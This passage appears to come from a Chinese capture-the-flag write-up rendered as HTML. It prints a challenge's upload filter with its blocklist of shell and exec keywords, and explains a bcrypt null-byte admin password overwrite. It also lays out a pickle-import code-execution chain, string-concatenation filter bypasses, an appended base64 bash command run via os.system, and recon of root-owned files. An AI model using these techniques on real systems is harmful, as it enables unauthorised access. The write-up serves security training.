+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="waf-wafpy"><span>WAF (waf.py)</span>
+  <a href="#waf-wafpy" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&#34;./files/uploads&#34;</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm -rf /app/files/uploads/*&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">60</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;base&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;builtin&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;code&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;command&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;eval&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="sa">b</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;flask&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;global&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;output&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;popen&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;pty&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="sa">b</span><span class="s2">&#34;repeat&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;run&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;setstate&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;spawn&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;subprocess&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;sys&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;system&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="sa">b</span><span class="s2">&#34;timeit&#34;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">secure_filename</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><strong>约束</strong>：</p>
+<ul>
+<li>文件内容 ≤ 60 字节</li>
+<li>禁止字节：<code>0x0A (\n)</code>, <code>0x0D (\r)</code>, <code>0x5C (\\)</code></li>
+<li>禁止 18 个子串（lowercased 检查）</li>
+<li>SHORT_BINUNICODE 长度不能为 10（产生 <code>0x0A</code>）</li>
+</ul>
+<hr>
+<h2 class="heading-element" id="认证绕过"><span>认证绕过</span>
+  <a href="#%e8%ae%a4%e8%af%81%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="bcrypt-null-byte-截断"><span>bcrypt Null-Byte 截断</span>
+  <a href="#bcrypt-null-byte-%e6%88%aa%e6%96%ad" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>admin\x00admin</code> 的 bcrypt hash 与 <code>admin</code> 相同（null 字节处截断）。</p>
+<p><strong>注册</strong>：<code>base64(&quot;admin\x00admin&quot;)</code> = <code>YWRtaW4AYWRtaW4=</code>，密码 <code>adminpass</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 注册 admin\x00admin → 覆盖 admin 的密码哈希</span>
+</span></span><span class="line"><span class="cl"><span class="n">usernames</span><span class="p">[</span><span class="sa">b</span><span class="s2">&#34;admin</span><span class="se">\x00</span><span class="s2">admin&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;admin</span><span class="se">\x00</span><span class="s2">admin&#34;</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>  <span class="c1"># = hash(&#34;admin&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">passwords</span><span class="p">[</span><span class="nb">hash</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;adminpass&#34;</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>           <span class="c1"># ← 覆盖！</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><strong>登录</strong>：以纯 <code>admin</code> / <code>adminpass</code> 登录，<code>session['username'] = b&quot;admin&quot;</code>。</p>
+<hr>
+<h2 class="heading-element" id="代码执行绕过-60b-waf"><span>代码执行（绕过 60B WAF）</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e7%bb%95%e8%bf%87-60b-waf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="py-文件导入法"><span>.py 文件导入法</span>
+  <a href="#py-%e6%96%87%e4%bb%b6%e5%af%bc%e5%85%a5%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>由于 WAF 限制，无法直接用 pickle 构造完整 RCE 链（所有执行原语均被拦截）。改用<strong>多层间接执行</strong>：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Step A: 上传 .py 文件 → /app/files/uploads/x.py
+</span></span><span class="line"><span class="cl">Step B: pickle shutil.copy → /app/{mod}.py  
+</span></span><span class="line"><span class="cl">Step C: pickle STACK_GLOBAL → import {mod} → 执行模块代码</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="waf-子串绕过"><span>WAF 子串绕过</span>
+  <a href="#waf-%e5%ad%90%e4%b8%b2%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>所有阻塞关键字通过 Python 字符串拼接绕过：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># blocked: &#39;os&#39; → bypass:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># blocked: &#39;system&#39; (contains &#39;sys&#39;) → bypass:</span>
+</span></span><span class="line"><span class="cl"><span class="n">o</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;sy&#39;</span><span class="o">+</span><span class="s1">&#39;stem&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># blocked: &#39;flag&#39; → bypass:</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;/fl&#39;</span><span class="o">+</span><span class="s1">&#39;ag&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># blocked: &#39;popen&#39; → bypass:</span>
+</span></span><span class="line"><span class="cl"><span class="n">o</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;po&#39;</span><span class="o">+</span><span class="s1">&#39;pen&#39;</span><span class="p">]</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="模块名长度约束"><span>模块名长度约束</span>
+  <a href="#%e6%a8%a1%e5%9d%97%e5%90%8d%e9%95%bf%e5%ba%a6%e7%ba%a6%e6%9d%9f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>SHORT_BINUNICODE 长度 = 0x0A 被 WAF 拦截。<code>/app/{mod}.py</code> 路径长度：</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>模块名长度</th>
+            <th>路径</th>
+            <th>长度</th>
+            <th>WAF</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>1 char (a)</td>
+            <td>/app/a.py</td>
+            <td>9</td>
+            <td>可行</td>
+        </tr>
+        <tr>
+            <td>2 chars (ab)</td>
+            <td>/app/ab.py</td>
+            <td>10</td>
+            <td>不可行 0x0A</td>
+        </tr>
+        <tr>
+            <td>3 chars (abc)</td>
+            <td>/app/abc.py</td>
+            <td>11</td>
+            <td>可行</td>
+        </tr>
+        <tr>
+            <td>4 chars (abcd)</td>
+            <td>/app/abcd.py</td>
+            <td>12</td>
+            <td>可行</td>
+        </tr>
+        <tr>
+            <td>5 chars (abcde)</td>
+            <td>/app/abcde.py</td>
+            <td>13</td>
+            <td>不可行 0x0D</td>
+        </tr>
+    </tbody>
+  </table>
+</div><h3 class="heading-element" id="追加模式突破-34-字符限制"><span>追加模式突破 34 字符限制</span>
+  <a href="#%e8%bf%bd%e5%8a%a0%e6%a8%a1%e5%bc%8f%e7%aa%81%e7%a0%b4-34-%e5%ad%97%e7%ac%a6%e9%99%90%e5%88%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>单次 Python write 只能承载 ~34 字符的 shell 命令。通过多次追加写入构建长命令：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Step 1: 创建脚本</span>
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/s&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;bash -c &#34;{echo,...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 2-5: 追加</span>
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/s&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;FzaCAtaSA+JiAv...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 6: 执行</span>
+</span></span><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">)</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;sy&#39;</span><span class="o">+</span><span class="s1">&#39;stem&#39;</span><span class="p">](</span><span class="s1">&#39;sh /tmp/s&#39;</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><hr>
+<h2 class="heading-element" id="信息收集-1"><span>信息收集</span>
+  <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="环境信息"><span>环境信息</span>
+  <a href="#%e7%8e%af%e5%a2%83%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">USER=ctf, SHELL=/bin/sh
+</span></span><span class="line"><span class="cl">SUDO_USER=root, SUDO_UID=0
+</span></span><span class="line"><span class="cl">SUDO_COMMAND=/usr/bin/python3 /app/app.py</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="flag-文件"><span>/flag 文件</span>
+  <a href="#flag-%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ stat /flag
+</span></span><span class="line"><span class="cl">  File: /flag
+</span></span><span class="line"><span class="cl">  Size: <span class="m">40</span>
+</span></span><span class="line"><span class="cl">  Access: <span class="o">(</span>0700/-rwx------<span class="o">)</span>  Uid: <span class="o">(</span>0/root<span class="o">)</span>   Gid: <span class="o">(</span>0/root<span class="o">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><strong>仅 root 可读写执行，ctf 无任何权限。</strong></p>
+<h3 class="heading-element" id="suid-二进制"><span>SUID 二进制</span>
+  <a href="#suid-%e4%ba%8c%e8%bf%9b%e5%88%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">/usr/bin/passwd, /usr/bin/mount, /usr/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/su, /usr/bin/chfn, /usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd, /usr/bin/sudo</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="cron-任务"><span>Cron 任务</span>
+  <a href="#cron-%e4%bb%bb%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
